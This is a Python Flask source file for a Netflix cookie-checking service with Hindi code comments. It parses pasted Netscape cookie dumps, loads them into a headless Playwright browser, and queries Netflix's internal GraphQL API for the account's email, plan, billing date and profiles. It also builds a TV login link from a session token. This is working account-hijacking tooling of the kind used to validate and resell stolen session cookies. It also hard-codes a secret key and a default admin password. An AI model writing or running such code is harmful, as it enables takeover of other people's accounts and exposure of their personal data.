import sqlite3
import random
import string
import re
import os
from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, session
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from playwright.sync_api import sync_playwright

app = Flask(__name__)
app.secret_key = 'super_secret_admin_key_123'

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS api_keys 
                 (id INTEGER PRIMARY KEY, key TEXT UNIQUE, owner TEXT, usage_limit INTEGER, usage_count INTEGER, is_active BOOLEAN)''')
    c.execute('''CREATE TABLE IF NOT EXISTS admin 
                 (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT)''')
    try:
        c.execute("INSERT INTO admin (username, password) VALUES (?, ?)", ('admin', generate_password_hash('admin123')))
    except sqlite3.IntegrityError:
        pass
    conn.commit()
    conn.close()

init_db()

def parse_netscape(text):
    cookies = {}
    for line in text.strip().splitlines():
        line = line.strip()
        if line.startswith("#HttpOnly_"):
            line = line.replace("#HttpOnly_", "", 1)
        if not line or line.startswith("#"):
            continue
        parts = re.split(r'\t+|\s+', line)
        if len(parts) >= 7:
            domain, name, value = parts[0], parts[5], parts[6]
            if "netflix.com" in domain:
                if len(parts) > 7: value = " ".join(parts[6:])
                cookies[name] = value
    return cookies

def get_account_info(cookies):
    try:
        with sync_playwright() as p:
            # Render पर हेडलेस ब्राउज़र चलाओ
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            
            # कुकीज को ब्राउज़र में डालो
            formatted_cookies = []
            for k, v in cookies.items():
                formatted_cookies.append({
                    "name": k,
                    "value": v,
                    "domain": ".netflix.com",
                    "path": "/"
                })
                
            context.add_cookies(formatted_cookies)
            page = context.new_page()
            
            # Netflix के होम पेज पर जाओ
            response = page.goto("https://www.netflix.com/browse", wait_until="networkidle")
            
            # अगर लॉगिन पेज पर रीडायरेक्ट हो गया तो कुकी डेड है
            if "login" in page.url:
                browser.close()
                return None
                
            # अब GraphQL API को सीधे ब्राउज़र के अंदर से हिट करो
            graphql_query = """
            query GetMemberInfo { 
                member { email countryOfSignup memberSince nextBillingDate currentPlan { planCode } profiles { profileName } } 
                token { default } 
            }
            """
            
            result = page.evaluate("""
                async (query) => {
                    const response = await fetch('/nq/website/memberapi/v3/graphql', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json',
                            'x-netflix.request.routing': '{}'
                        },
                        body: JSON.stringify({
                            operationName: 'GetMemberInfo',
                            variables: {},
                            query: query
                        })
                    });
                    return await response.json();
                }
            """, graphql_query)
            
            browser.close()
            
            if result and "data" in result and "member" in result["data"]:
                member = result["data"]["member"]
                email = member.get("email", "Unknown")
                country = member.get("countryOfSignup", "Unknown")
                plan = member.get("currentPlan", {}).get("planCode", "Unknown").upper()
                member_since = str(member.get("memberSince", "Unknown")).split("T")[0]
                next_billing = str(member.get("nextBillingDate", "Unknown")).split("T")[0]
                profiles = [p.get("profileName", "Unknown") for p in member.get("profiles", [])]
                
                token = result["data"].get("token", {}).get("default", "")
                tv_link = f"https://www.netflix.com/tv8?nftoken={token}" if token else "Not Available"
                
                return {
                    "email": email,
                    "country": country,
                    "plan": plan,
                    "member_since": member_since,
                    "bills_on": next_billing,
                    "profiles": ", ".join(profiles),
                    "pc_link": "https://www.netflix.com/browse",
                    "mobile_link": "https://www.netflix.com/browse",
                    "tv_link": tv_link
                }
                
    except Exception as e:
        print(f"Playwright Error: {e}")
        return None
        
    return None

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('is_admin'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/check', methods=['POST'])
def free_check():
    data = request.json
    raw_cookie = data.get('cookie', '')
    cookies = parse_netscape(raw_cookie)
    
    if not cookies:
        return jsonify({"success": False, "error": "No valid cookies found."})
        
    info = get_account_info(cookies)
    if info:
        return jsonify({"success": True, "data": info})
    return jsonify({"success": False, "error": "Cookie is dead or invalid."})

# ... (एडमिन रूट्स यहाँ वही रहेंगे जो पहले थे) ...

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
